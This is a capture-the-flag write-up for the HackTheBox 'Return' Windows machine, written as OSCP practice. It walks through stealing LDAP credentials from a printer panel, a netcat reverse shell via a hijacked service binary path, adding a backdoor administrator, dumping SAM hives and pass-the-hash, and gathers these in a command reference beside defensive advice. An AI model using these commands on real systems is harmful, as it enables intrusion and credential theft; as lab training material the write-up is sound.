# Return - HackTheBox Educational Writeup
## Windows Server | Easy | No Metasploit

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Reconnaissance](#2-reconnaissance)
3. [Initial Foothold](#3-initial-foothold)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Alternative Paths Explored](#5-alternative-paths-explored)
6. [Troubleshooting & Failures](#6-troubleshooting--failures)
7. [Key Takeaways](#7-key-takeaways)
8. [Defense Recommendations](#8-defense-recommendations)
9. [Command Reference](#9-command-reference)

---

## 1. Executive Summary

| Property | Value |
|----------|-------|
| **Target IP** | 10.10.11.108 |
| **OS** | Windows Server 2019 |
| **Domain** | return.local |
| **Hostname** | PRINTER |
| **Difficulty** | Easy |
| **Attack Vector** | Network Printer LDAP Credential Theft |
| **PrivEsc Vector** | Server Operators Group - Service Binary Abuse |

### Attack Chain Diagram

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Port 80        │     │  Capture LDAP    │     │  WinRM Access   │
│  Printer Admin  │────▶│  Credentials     │────▶│  svc-printer    │
│  Panel          │     │  via nc listener │     │                 │
└─────────────────┘     └──────────────────┘     └────────┬────────┘
                                                          │
                                                          ▼
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  SYSTEM Shell   │     │  Service Binary  │     │ Server Operators│
│  (root.txt)     │◀────│  Path Hijack     │◀────│ Group Member    │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

---

## 2. Reconnaissance

### 2.1 Port Scanning

```bash
# Fast port discovery
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.108 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

# Service enumeration
nmap -p$ports -sV -sC 10.10.11.108
```

**Results:**
| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Microsoft IIS 10.0 |
| 445 | SMB | Microsoft Windows SMB |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 |

**Key Observations:**
- IIS hosting "HTB Printer Admin Panel"
- WinRM open (potential remote access if we get creds)
- Domain-joined machine (return.local)

### 2.2 SMB Enumeration

```bash
enum4linux -a 10.10.11.108
```

**Results:**
- Domain: RETURN
- NULL/Guest sessions blocked
- No anonymous share access

### 2.3 Web Enumeration

Browsing to `http://10.10.11.108` reveals a **printer administration panel**.

**Settings Page (`/settings.php`) reveals:**
- Server Address: `printer.return.local`
- Server Port: `389` (LDAP)
- Username: `svc-printer`
- Password: `*******` (hidden)

**Critical Finding:** The "Server Address" field is user-controllable and the printer will attempt to authenticate to whatever server is specified.

---

## 3. Initial Foothold

### 3.1 The Vulnerability

Enterprise printers often store LDAP/SMB credentials to:
- Query Active Directory for user lists
- Save scanned documents to network shares
- Authenticate users for secure printing

When we change the "Server Address" to our IP, the printer attempts LDAP authentication to us, **sending credentials in plaintext**.

### 3.2 Exploitation Steps

**Step 1: Start LDAP Listener**
```bash
sudo nc -lvnp 389
# Purpose: Listen on LDAP port to capture credentials
# sudo required: Port 389 is privileged (<1024)
```

**Step 2: Trigger Credential Submission**

Navigate to `http://10.10.11.108/settings.php` and change:
- Server Address: `YOUR_KALI_IP` (e.g., 10.10.16.10)
- Click "Update"

Or via command line:
```bash
curl -X POST http://10.10.11.108/settings.php -d "ip=10.10.16.10"
```

**Step 3: Capture Credentials**
```
listening on [any] 389 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.108] 51155
0*`%return\svc-printer
                      1edFg43012!!
```

**Credentials Obtained:**
- Username: `svc-printer`
- Password: `1edFg43012!!`
- Domain: `return.local`

### 3.3 Gaining Shell Access

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

**Flags Explained:**
| Flag | Purpose |
|------|---------|
| `-i` | Target IP address |
| `-u` | Username |
| `-p` | Password (single quotes prevent bash from interpreting `!`) |

**User Flag:**
```powershell
type C:\Users\svc-printer\Desktop\user.txt
```

---

## 4. Privilege Escalation

### 4.1 Enumeration

**Check User Info:**
```powershell
whoami /all
```

**Key Findings:**

**Group Memberships:**
```
BUILTIN\Server Operators    (Privileged Group!)
BUILTIN\Print Operators
BUILTIN\Remote Management Users
```

**Token Privileges:**
```
SeBackupPrivilege           Enabled
SeRestorePrivilege          Enabled
SeLoadDriverPrivilege       Enabled
SeShutdownPrivilege         Enabled
```

### 4.2 Understanding Server Operators

The **Server Operators** group is a built-in Windows group with significant privileges:

| Capability | Security Impact |
|------------|-----------------|
| Start/Stop services | Can manipulate service behavior |
| Backup files and directories | Read any file (SeBackupPrivilege) |
| Restore files and directories | Write any file (SeRestorePrivilege) |
| Log on locally | Direct console access |
| Shut down the system | DoS capability |

**The Attack:** Members can modify service configurations, including the binary path. By pointing a service to a malicious binary, we execute code as SYSTEM when the service starts.

### 4.3 Exploitation (Without Metasploit)

**Step 1: Start Listener on Kali**
```bash
nc -lvnp 4444
# No sudo needed - port 4444 is unprivileged
```

**Step 2: Upload Netcat to Target**
```powershell
# In evil-winrm session
upload /usr/share/windows-resources/binaries/nc.exe C:\Users\svc-printer\Documents\nc.exe
```

**Step 3: Modify Service Binary Path**
```powershell
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.10 4444"
```

**Command Breakdown:**
| Component | Purpose |
|-----------|---------|
| `sc.exe config` | Modify service configuration |
| `vss` | Volume Shadow Copy service (runs as SYSTEM) |
| `binPath=` | Set the executable path |
| `nc.exe -e cmd.exe` | Execute cmd.exe and pipe to network |
| `10.10.16.10 4444` | Connect back to our listener |

**Step 4: Trigger the Service**
```powershell
sc.exe stop vss
sc.exe start vss
```

**Step 5: Receive SYSTEM Shell**
```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.108] 49727
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### 4.4 Dealing with Shell Instability

**The Problem:** The shell dies after ~10-30 seconds because nc.exe is not a proper Windows service binary. Windows Service Control Manager expects services to register properly.

**Solution Options:**

**Option A: Be Fast (Simplest)**
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Option B: Create Persistent Access (Recommended)**
```cmd
net user hacker Password123! /add
net localgroup Administrators hacker /add
```

Then reconnect with stable access:
```bash
evil-winrm -i 10.10.11.108 -u hacker -p 'Password123!'
```

**Option C: Use PowerShell Reverse Shell (More Stable)**
```powershell
# Configure service to run PowerShell instead
sc.exe config vss binPath="cmd.exe /c powershell -ep bypass -e <BASE64_ENCODED_REVSHELL>"
```

---

## 5. Alternative Paths Explored

### 5.1 SeBackupPrivilege Abuse

**Theory:** SeBackupPrivilege allows reading ANY file, bypassing ACLs. On a Domain Controller, we can:
1. Dump SAM/SYSTEM hives for local hashes
2. Dump NTDS.dit for ALL domain hashes

**Attempted Methods:**

#### Method 1: Registry Dump (Partial Success)
```powershell
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

```bash
# On Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Result:** Obtained local Administrator hash, but **Pass-the-Hash failed** because this is a Domain Controller - local SAM Administrator differs from Domain Administrator.

#### Method 2: NTDS.dit via ntdsutil (Failed)
```powershell
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q
```
**Error:** `Access is denied` - requires higher privileges than Server Operators.

#### Method 3: NTDS.dit via diskshadow (Failed)
```powershell
diskshadow /s C:\Temp\shadow.txt
```
**Error:** `COM call "InitializeForBackup" failed` - VSS service issues.

**Lesson Learned:** While SeBackupPrivilege is powerful, exploiting it on a DC to dump NTDS.dit requires additional privileges or service manipulation. The Server Operators service abuse path is more reliable here.

### 5.2 SeLoadDriverPrivilege Abuse

**Theory:** Load a vulnerable kernel driver (e.g., Capcom.sys) to execute arbitrary code in kernel mode.

**Not Attempted:** More complex than service abuse and requires additional tools. Documented for completeness.

### 5.3 SeRestorePrivilege Abuse

**Theory:** Write to ANY location, bypassing ACLs. Could overwrite system binaries or DLLs.

**Not Attempted:** Service abuse was simpler and achieved the same goal.

---

## 6. Troubleshooting & Failures

### 6.1 Evil-WinRM Connection Failures

**Symptom:**
```
Error: An error of type WinRM::WinRMAuthorizationError happened
```

**Causes & Solutions:**

| Cause | Solution |
|-------|----------|
| Wrong credentials | Re-capture via printer panel |
| Box reset by HTB | Re-capture credentials |
| Special characters in password | Use single quotes: `-p '1edFg43012!!'` |
| Concurrent session limit | Close other WinRM sessions |

### 6.2 SMB File Transfer Issues

**Symptom:**
```
OSError: [Errno 98] Address already in use
```

**Solution:**
```bash
# Kill existing SMB server
pkill -f smbserver
# Or find and kill the process
ss -tlnp | grep 445
kill <PID>
```

### 6.3 Pass-the-Hash Failures

**Symptom:**
```
STATUS_LOGON_FAILURE
```

**Causes:**

| Scenario | Explanation |
|----------|-------------|
| Local vs Domain hash | SAM contains local accounts; Domain accounts are in NTDS.dit |
| Hash format error | Format: `LMHASH:NTHASH` (no extra colons) |
| Wrong IP | Verify target IP |

**Correct Format:**
```bash
# WRONG (too many colons)
-hashes aad3b435...:aad3b435...:34386a77...

# CORRECT
-hashes aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a
```

### 6.4 Reverse Shell Dies Quickly

**Symptom:** SYSTEM shell closes after 10-30 seconds.

**Cause:** Windows services must register with Service Control Manager (SCM). nc.exe doesn't, so SCM terminates it.

**Solutions:**
1. Work fast - grab flags immediately
2. Create new admin user for persistent access
3. Use service-aware payload (not covered - requires Metasploit)

---

## 7. Key Takeaways

### 7.1 For OSCP Exam

| Lesson | Application |
|--------|-------------|
| Check group memberships | `whoami /groups` - Server Operators is gold |
| Check privileges | `whoami /priv` - SeBackup/SeRestore are exploitable |
| Printers leak creds | Always check for printer/admin panels |
| Service abuse > SeBackup | On DCs, service manipulation is more reliable |
| Create persistent access | First command in SYSTEM shell: add admin user |

### 7.2 Methodology Reinforcement

1. **Enumerate thoroughly** before exploiting
2. **Document everything** including failures
3. **Have backup plans** when primary attack fails
4. **Understand why** attacks work (or don't)
5. **Practice without Metasploit** for exam readiness

### 7.3 Skills Developed

- Network printer exploitation
- Windows service manipulation
- Token privilege abuse
- Pass-the-hash techniques
- Troubleshooting authentication failures

---

## 8. Defense Recommendations

### 8.1 Printer Security

| Control | Implementation |
|---------|----------------|
| Network segmentation | Isolate printers from sensitive networks |
| Credential rotation | Regular password changes for service accounts |
| Disable unnecessary features | Remove LDAP configuration if unused |
| Monitor outbound connections | Alert on printers connecting to unknown IPs |

### 8.2 Service Account Hardening

| Control | Implementation |
|---------|----------------|
| Least privilege | Don't add service accounts to Server Operators |
| Managed Service Accounts | Use gMSA for automatic password rotation |
| Monitor group membership | Alert on changes to privileged groups |

### 8.3 Detection Opportunities

| Attack Stage | Detection Method |
|--------------|------------------|
| Credential theft | Outbound LDAP to non-DC IPs |
| Service modification | Event ID 7040 (Service config change) |
| New user creation | Event ID 4720 (User account created) |
| Pass-the-hash | Event ID 4624 with LogonType 9 |

---

## 9. Command Reference

### Reconnaissance
```bash
# Port scan
nmap -p- --min-rate=1000 -T4 TARGET
nmap -p$ports -sV -sC TARGET

# SMB enumeration
enum4linux -a TARGET
netexec smb TARGET -u '' -p ''
```

### Credential Capture
```bash
# LDAP listener
sudo nc -lvnp 389

# Trigger via curl
curl -X POST http://TARGET/settings.php -d "ip=KALI_IP"
```

### Initial Access
```bash
# WinRM connection
evil-winrm -i TARGET -u USER -p 'PASSWORD'

# Verify credentials
netexec winrm TARGET -u USER -p 'PASSWORD'
netexec smb TARGET -u USER -p 'PASSWORD'
```

### Privilege Escalation
```powershell
# Enumeration
whoami /all
net user USERNAME

# Upload nc.exe
upload /usr/share/windows-resources/binaries/nc.exe C:\Temp\nc.exe

# Service abuse
sc.exe config vss binPath="C:\Temp\nc.exe -e cmd.exe KALI_IP 4444"
sc.exe stop vss
sc.exe start vss

# Persistent access (run in SYSTEM shell)
net user hacker Password123! /add
net localgroup Administrators hacker /add
```

### File Transfer
```bash
# Start SMB server (Kali)
impacket-smbserver share /tmp -smb2support

# Copy files (Target)
copy C:\Temp\file.txt \\KALI_IP\share\file.txt
```

### Hash Extraction
```bash
# Extract from SAM/SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Pass-the-hash
evil-winrm -i TARGET -u Administrator -H NTHASH
impacket-psexec DOMAIN/Administrator@TARGET -hashes LMHASH:NTHASH
```

---

## Appendix: Files Created During Attack

| File | Location | Purpose |
|------|----------|---------|
| nc.exe | C:\Users\svc-printer\Documents\ | Reverse shell binary |
| SAM | C:\Temp\ | Local account database |
| SYSTEM | C:\Temp\ | Registry hive (boot key) |

---

*Writeup created for educational purposes. Always obtain proper authorization before testing.*

**Time to Complete:** ~45 minutes (with troubleshooting)
**Exam Relevance:** High - No Metasploit required
